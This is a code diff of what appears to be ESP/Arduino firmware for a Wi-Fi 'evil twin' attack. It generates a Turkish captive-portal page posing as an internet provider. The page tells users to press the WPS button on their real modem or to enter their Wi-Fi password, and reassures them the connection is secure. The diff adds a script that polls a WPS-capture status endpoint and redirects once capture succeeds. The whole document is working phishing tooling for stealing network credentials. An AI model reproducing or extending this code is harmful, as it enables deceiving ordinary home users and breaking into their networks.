@@ -514,11 +514,9 @@ void handle_root() {
 
 // ─── WPS PBC + Şifre Kombine Portal Sayfası ──────────────────────────────────
 // Hem WPS PBC hem de şifre formu aynı sayfada — görsel modem diyagramı ile.
-// Sıradan kullanıcının bile anlayabileceği sade Türkçe talimatlar.
 static String portal_wps_page() {
   String ssid = evil_twin_ssid;
 
-  // ── CSS ──────────────────────────────────────────────────────────────────
   String h = F("<!DOCTYPE html><html><head>"
     "<meta charset='UTF-8'>"
     "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
@@ -528,8 +526,6 @@ static String portal_wps_page() {
     "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
     "body{font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
       "background:#f0f2f5;color:#1a1a2e;min-height:100vh}"
-
-    // ISP header bandı
     ".hdr{background:linear-gradient(90deg,#c0392b,#e74c3c);"
       "padding:14px 20px;display:flex;align-items:center;gap:12px;color:#fff;"
       "box-shadow:0 2px 8px rgba(0,0,0,.25)}"
@@ -538,24 +534,16 @@ static String portal_wps_page() {
       "font-size:20px;flex-shrink:0}"
     ".hdr-title{font-size:1em;font-weight:700;letter-spacing:-.2px}"
     ".hdr-sub{font-size:.75em;opacity:.85;margin-top:2px}"
-
-    // Uyarı şeridi
     ".warn-bar{background:#fff3cd;border-bottom:2px solid #f0b429;"
       "padding:11px 20px;font-size:.85em;color:#7d4e00;"
       "display:flex;align-items:center;gap:8px;line-height:1.4}"
-
-    // Ana içerik
     ".wrap{max-width:480px;margin:0 auto;padding:16px 14px 32px}"
-
-    // Ağ adı etiketi
     ".net-lbl{background:#fff;border:1px solid #dde1ea;border-radius:10px;"
       "padding:11px 15px;display:flex;align-items:center;gap:10px;"
       "margin-bottom:16px;box-shadow:0 1px 3px rgba(0,0,0,.07)}"
     ".net-lbl .wifi-ico{font-size:22px}"
     ".net-name{font-weight:700;color:#1a1a2e;font-size:.95em;word-break:break-all}"
     ".net-sub{font-size:.72em;color:#888;margin-top:1px}"
-
-    // Yöntem kutuları
     ".method{background:#fff;border-radius:14px;margin-bottom:14px;"
       "overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);border:1px solid #e0e4ed}"
     ".m-head{padding:13px 16px;display:flex;align-items:center;gap:10px;color:#fff}"
@@ -565,13 +553,9 @@ static String portal_wps_page() {
       "padding:2px 8px;border-radius:10px;letter-spacing:.4px;text-transform:uppercase}"
     ".m-head-title{font-weight:700;font-size:1em;flex:1}"
     ".m-body{padding:16px}"
-
-    // WPS görsel
     ".modem-diagrams{display:flex;gap:10px;justify-content:center;margin-bottom:14px;flex-wrap:wrap}"
     ".diag-wrap{text-align:center}"
     ".diag-lbl{font-size:.68em;color:#888;margin-top:5px;font-weight:600}"
-
-    // WPS adımları
     ".wps-steps{display:flex;flex-direction:column;gap:0}"
     ".ws{display:flex;align-items:flex-start;gap:12px;padding:10px 0;"
       "border-bottom:1px solid #f0f2f5}"
@@ -582,8 +566,6 @@ static String portal_wps_page() {
     ".ws-txt{font-size:.88em;color:#333;line-height:1.55}"
     ".ws-txt b{color:#1a1a2e}"
     ".ws-txt .note{font-size:.82em;color:#888;margin-top:2px;display:block}"
-
-    // WPS bekleme animasyonu
     ".wps-wait{background:#e3f2fd;border:1px solid #90caf9;border-radius:8px;"
       "padding:10px 14px;margin-top:12px;display:flex;align-items:center;gap:10px;"
       "font-size:.82em;color:#1565c0}"
@@ -591,12 +573,8 @@ static String portal_wps_page() {
       "border-top-color:#1565c0;border-radius:50%;"
       "animation:spin .8s linear infinite;flex-shrink:0}"
     "@keyframes spin{to{transform:rotate(360deg)}}"
-
-    // Ayraç
     ".or-div{display:flex;align-items:center;gap:10px;margin:4px 0 14px;color:#aaa;font-size:.8em}"
     ".or-div::before,.or-div::after{content:'';flex:1;height:1px;background:#dde1ea}"
-
-    // Şifre formu
     ".pw-field{position:relative;margin-bottom:10px}"
     ".pw-inp{width:100%;height:50px;border:2px solid #dde1ea;border-radius:10px;"
       "padding:0 48px 0 14px;font-size:1em;color:#1a1a2e;background:#f8f9fc;"
@@ -610,10 +588,8 @@ static String portal_wps_page() {
       "color:#fff;border:none;border-radius:10px;font-size:1em;font-weight:700;"
       "cursor:pointer;font-family:inherit;letter-spacing:.2px;transition:opacity .2s}"
     ".pw-btn:hover{opacity:.88}"
-
     "</style></head><body>");
 
-  // ── ISP Header ────────────────────────────────────────────────────────────
   h += F("<div class='hdr'>"
     "<div class='hdr-ico'>&#128225;</div>"
     "<div>"
@@ -628,7 +604,6 @@ static String portal_wps_page() {
   "</div>"
   "<div class='wrap'>");
 
-  // ── Ağ adı göster ────────────────────────────────────────────────────────
   h += F("<div class='net-lbl'>"
     "<span class='wifi-ico'>&#128225;</span>"
     "<div><div class='net-name'>");
@@ -638,9 +613,6 @@ static String portal_wps_page() {
     "</div>"
   "</div>");
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // YÖNTEM 1 — WPS ile Bağlan
-  // ══════════════════════════════════════════════════════════════════════════
   h += F("<div class='method'>"
     "<div class='m-head wps'>"
       "<span style='font-size:22px'>&#128275;</span>"
@@ -654,60 +626,44 @@ static String portal_wps_page() {
         " Hi&#231;bir &#351;ifre girmenize gerek yok."
       "</p>");
 
-  // ── SVG Modem Diyagramları ───────────────────────────────────────────────
   h += F("<div class='modem-diagrams'>"
-
-    // Diyagram 1: Dikey modem (ZTE/Huawei/Sagemcom tipi) — WPS önde
     "<div class='diag-wrap'>"
     "<svg width='110' height='130' viewBox='0 0 110 130' xmlns='http://www.w3.org/2000/svg'>"
-      // Modem gövdesi
       "<rect x='20' y='8' width='70' height='110' rx='8' fill='#2c3e50'/>"
       "<rect x='24' y='12' width='62' height='102' rx='6' fill='#34495e'/>"
-      // LED ışıkları (üstte)
       "<circle cx='35' cy='24' r='3' fill='#2ecc71'/>"
       "<circle cx='45' cy='24' r='3' fill='#2ecc71'/>"
       "<circle cx='55' cy='24' r='3' fill='#f39c12' opacity='0.6'/>"
       "<circle cx='65' cy='24' r='3' fill='#e74c3c' opacity='0.4'/>"
-      // WPS tuşu (parlayan, büyük)
       "<rect x='32' y='80' width='46' height='22' rx='11' fill='#1565c0' "
         "style='filter:drop-shadow(0 0 6px #42a5f5)'/>"
       "<text x='55' y='95' text-anchor='middle' fill='white' "
         "font-size='9' font-weight='bold' font-family='Arial'>WPS</text>"
-      // Ok işareti - WPS tuşuna
       "<path d='M55 108 L55 118 L50 113 M55 118 L60 113' "
         "stroke='#f39c12' stroke-width='2' fill='none' stroke-linecap='round'/>"
-      // Etiket
       "<text x='55' y='128' text-anchor='middle' fill='#f39c12' "
         "font-size='7' font-weight='bold' font-family='Arial'>WPS TU&#350;U</text>"
-      // Anten gösterimi
       "<rect x='40' y='2' width='4' height='10' rx='2' fill='#7f8c8d'/>"
       "<rect x='66' y='2' width='4' height='10' rx='2' fill='#7f8c8d'/>"
     "</svg>"
     "<div class='diag-lbl'>Dikey Modem<br>(&#214;ndeki Tu&#351;)</div>"
     "</div>"
-
-    // Diyagram 2: Yatay router (ASUS/Linksys/TP-Link tipi) — WPS yanda
     "<div class='diag-wrap'>"
     "<svg width='140' height='90' viewBox='0 0 140 90' xmlns='http://www.w3.org/2000/svg'>"
-      // Router gövdesi
       "<rect x='10' y='25' width='110' height='52' rx='8' fill='#2c3e50'/>"
       "<rect x='14' y='29' width='102' height='44' rx='6' fill='#34495e'/>"
-      // LED ışıklar (sol taraf)
       "<circle cx='24' cy='40' r='3' fill='#2ecc71'/>"
       "<circle cx='24' cy='50' r='3' fill='#2ecc71'/>"
       "<circle cx='24' cy='60' r='3' fill='#f39c12' opacity='0.7'/>"
-      // Antenler
       "<rect x='20' y='5' width='5' height='22' rx='2.5' fill='#7f8c8d'"
         " transform='rotate(-10 22 16)'/>"
       "<rect x='115' y='5' width='5' height='22' rx='2.5' fill='#7f8c8d'"
         " transform='rotate(10 117 16)'/>"
-      // WPS tuşu (sağ yan)
       "<rect x='100' y='36' width='18' height='30' rx='5' fill='#1565c0'"
         " style='filter:drop-shadow(0 0 5px #42a5f5)'/>"
       "<text x='109' y='54' text-anchor='middle' fill='white' "
         "font-size='6' font-weight='bold' font-family='Arial' "
         "transform='rotate(90 109 54)'>WPS</text>"
-      // Ok - WPS tuşuna
       "<path d='M122 51 L132 51 L128 47 M132 51 L128 55' "
         "stroke='#f39c12' stroke-width='2' fill='none' stroke-linecap='round'/>"
       "<text x='130' y='66' text-anchor='middle' fill='#f39c12' "
@@ -715,39 +671,28 @@ static String portal_wps_page() {
     "</svg>"
     "<div class='diag-lbl'>Yatay Router<br>(Yan Ta&#351;&#305;ndaki Tu&#351;)</div>"
     "</div>"
-
-    // Diyagram 3: Küçük boxy modem (Sagemcom/Arcadyan tipi) — WPS arkada
     "<div class='diag-wrap'>"
     "<svg width='100' height='90' viewBox='0 0 100 90' xmlns='http://www.w3.org/2000/svg'>"
-      // Modem gövdesi (boxy)
       "<rect x='15' y='20' width='70' height='55' rx='6' fill='#2c3e50'/>"
       "<rect x='19' y='24' width='62' height='47' rx='4' fill='#34495e'/>"
-      // LED
       "<circle cx='30' cy='35' r='3' fill='#2ecc71'/>"
       "<circle cx='40' cy='35' r='3' fill='#2ecc71'/>"
       "<circle cx='50' cy='35' r='3' fill='#2ecc71'/>"
-      // WPS tuşu (önde)
       "<rect x='28' y='52' width='44' height='12' rx='6' fill='#1565c0'"
         " style='filter:drop-shadow(0 0 4px #42a5f5)'/>"
       "<text x='50' y='61.5' text-anchor='middle' fill='white' "
         "font-size='7' font-weight='bold' font-family='Arial'>WPS</text>"
-      // Ok
       "<path d='M50 75 L50 83 L46 79 M50 83 L54 79' "
         "stroke='#f39c12' stroke-width='1.8' fill='none' stroke-linecap='round'/>"
-      // Etiket
       "<text x='50' y='90' text-anchor='middle' fill='#f39c12' "
         "font-size='6.5' font-weight='bold' font-family='Arial'>WPS TU&#350;U</text>"
-      // Anten
       "<rect x='45' y='10' width='4' height='14' rx='2' fill='#7f8c8d'/>"
     "</svg>"
     "<div class='diag-lbl'>Kare Modem<br>(&#214;ndeki Tu&#351;)</div>"
     "</div>"
+  "</div>");
 
-  "</div>"); // .modem-diagrams
-
-  // ── Adım Adım Talimatlar ─────────────────────────────────────────────────
   h += F("<div class='wps-steps'>"
-
     "<div class='ws'>"
       "<div class='ws-num'>1</div>"
       "<div class='ws-txt'>"
@@ -755,7 +700,6 @@ static String portal_wps_page() {
         "<span class='note'>Genellikle TV&#39;nin veya bilgisayar&#305;n yak&#305;n&#305;nda bulunur.</span>"
       "</div>"
     "</div>"
-
     "<div class='ws'>"
       "<div class='ws-num'>2</div>"
       "<div class='ws-txt'>"
@@ -764,16 +708,14 @@ static String portal_wps_page() {
         " Genellikle k&#252;&#231;&#252;k, bas&#305;labilir bir tu&#351;tur.</span>"
       "</div>"
     "</div>"
-
     "<div class='ws'>"
       "<div class='ws-num'>3</div>"
       "<div class='ws-txt'>"
         "<b>WPS tu&#351;una <span style='color:#e74c3c'>3&#8211;5 saniye</span> bas&#305;l&#305; tutun.</b>"
         "<span class='note'>Modemin LED &#305;&#351;&#305;&#287;&#305; yan&#305;p s&#246;nmeye ba&#351;lar"
-        " — bu normaldir, ba&#287;lant&#305; kuruluyordur.</span>"
+        " &mdash; bu normaldir, ba&#287;lant&#305; kuruluyordur.</span>"
       "</div>"
     "</div>"
-
     "<div class='ws'>"
       "<div class='ws-num'>4</div>"
       "<div class='ws-txt'>"
@@ -782,25 +724,17 @@ static String portal_wps_page() {
         " sayfa kendili&#287;inden g&#252;ncellenecek.</span>"
       "</div>"
     "</div>"
+  "</div>");
 
-  "</div>"); // .wps-steps
-
-  // ── WPS Bekleme Durumu ───────────────────────────────────────────────────
   h += F("<div class='wps-wait'>"
     "<div class='spin-sm'></div>"
     "<span>WPS ba&#287;lant&#305;s&#305; bekleniyor&#8230; Tu&#351;a bast&#305;ktan sonra"
     " otomatik tamamlanacak.</span>"
   "</div>"
-  "</div></div>"); // .m-body .method
+  "</div></div>");
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // AYRAÇ
-  // ══════════════════════════════════════════════════════════════════════════
   h += F("<div class='or-div'>veya</div>");
 
-  // ══════════════════════════════════════════════════════════════════════════
-  // YÖNTEM 2 — Şifre ile Bağlan
-  // ══════════════════════════════════════════════════════════════════════════
   h += F("<div class='method'>"
     "<div class='m-head pw'>"
       "<span style='font-size:22px'>&#128273;</span>"
@@ -824,17 +758,22 @@ static String portal_wps_page() {
     "</div>"
   "</div>");
 
-  // ── Footer ────────────────────────────────────────────────────────────────
   h += F("<p style='text-align:center;font-size:.72em;color:#bbb;margin-top:16px;line-height:1.6'>"
     "&#128274; Ba&#287;lant&#305;n&#305;z g&#252;venli protokol ile korunmaktad&#305;r.<br>"
     "Sorununuz devam ederse servis sa&#287;lay&#305;c&#305;n&#305;z&#305; aray&#305;n."
   "</p>"
-  "</div>"  // .wrap
+  "</div>"
   "<script>"
     "function togglePw(){"
       "var p=document.getElementById('pw');"
       "p.type=p.type==='password'?'text':'password'"
     "}"
+    "setInterval(function(){"
+      "fetch('/et_wps_pbc_status')"
+        ".then(function(r){return r.json();})"
+        ".then(function(d){if(d.f)location.href='/portal';})"
+        ".catch(function(){});"
+    "},4000);"
   "</script>"
   "</body></html>");
 
@@ -897,8 +836,7 @@ static String portal_wps_success_page() {
 // Renk teması: prefers-color-scheme ile cihazdan otomatik alınır
 
 // ─── WPS + Modem Etiket Animasyon Bloğu ──────────────────────────────────────
-// Tüm portal sayfalarında ortak kullanılan animasyonlu açıklama kutusu.
-// 3 kare döngüsü: ön yüz → arka etiket → WPS tuşu (9 saniye)
+// Tüm portal sayfalarında ortak kullanılan WPS ipucu kutusu.
 static String portal_wps_hint() {
   return F(
     "<div style='"
@@ -935,6 +873,7 @@ static String portal_wps_hint() {
     "</div>"
   );
 }
+
 
 static String portal_wps_anim_block() {
   return portal_wps_hint();
